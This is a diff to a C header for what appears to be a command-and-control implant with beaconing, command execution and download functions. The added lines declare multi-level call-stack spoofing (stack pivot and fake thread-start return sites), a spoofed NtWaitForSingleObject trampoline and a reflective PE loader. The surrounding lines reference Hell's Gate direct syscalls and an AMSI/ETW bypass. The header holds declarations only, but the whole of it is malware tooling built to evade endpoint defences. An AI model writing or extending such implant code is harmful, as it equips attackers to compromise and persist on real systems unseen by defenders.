@@ -76,7 +76,13 @@ extern AgentState g_agent;
 /* ── Hell's Gate globals (defined in hellsgate.c / syscall_stub.asm) ────── */
 extern DWORD  g_ssn;
 extern PVOID  g_gadget;
-extern PVOID  g_k32_ret;   /* kernel32 "ret" gadget for call-stack spoofing */
+extern PVOID  g_k32_ret;   /* kernel32 "ret" gadget for single-level call-stack spoof */
+
+/* ── Multi-level call-stack synthesis globals (syscall_stub.asm / callstack.c) */
+extern DWORD  g_wait_ssn;  /* SSN for NtWaitForSingleObject */
+extern PVOID  g_pivot;     /* add rsp,0x20; ret — stack pivot in ntdll .text */
+extern PVOID  g_btt;       /* kernel32!BaseThreadInitThunk return site */
+extern PVOID  g_rtl;       /* ntdll!RtlUserThreadStart return site */
 
 /* ── BCrypt function pointers (defined in crypto.c) ─────────────────────── */
 extern pfnBCryptOpenAlgorithmProvider    pBCryptOpenAlgorithmProvider;
@@ -104,6 +110,7 @@ extern pfnWinHttpSetOption         pWinHttpSetOption;
 BOOL     HellsGateInit(void);
 DWORD    HellsGateSSN(const char *funcName);
 BOOL     HellsGateSetSSN(const char *funcName);
+PVOID    HellsGateNtdllBase(void);   /* returns cached ntdll base for callstack.c */
 
 /* syscalls.c */
 NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect);
@@ -121,6 +128,12 @@ NTSTATUS NtUnmap(PVOID base);
 /* called by assembly stub — wraps HellsGateCall with arg setup */
 NTSTATUS HellsGateCall(PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
                         PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8);
+
+/* callstack.c */
+void     InitCallstackGadgets(PVOID ntdllBase);
+
+/* ASM trampoline — NtWaitForSingleObject with multi-level fake call stack */
+NTSTATUS SpoofedNtWait(HANDLE hObject, BOOLEAN alertable, PLARGE_INTEGER timeout);
 
 /* crypto.c */
 BOOL CryptoInit(void);
@@ -151,6 +164,7 @@ void  StrToWstr(const char *s, WCHAR *out, int outCap);
 void *ImplantAlloc(SIZE_T n);
 void  ImplantFree(void *p);
 char *ImplantStrDup(const char *s);
+void  SecureZero(void *buf, SIZE_T len);
 
 /* evasion.c */
 BOOL EvasionInit(void);   /* sets up AMSI + ETW HWBP bypass via VEH */
@@ -169,3 +183,6 @@ BOOL BeaconSend(const AgentResult *lastResult, AgentCommand *cmdOut);
 AgentResult *ExecuteCommand(const AgentCommand *cmd);
 void         FreeResult(AgentResult *r);
 char        *HttpPost_GET(const char *url, DWORD *outLen); /* used by dl command */
+
+/* reflect.c */
+BOOL ReflectiveLoad(const BYTE *peData, SIZE_T peSize, PVOID param, BOOL isDll);
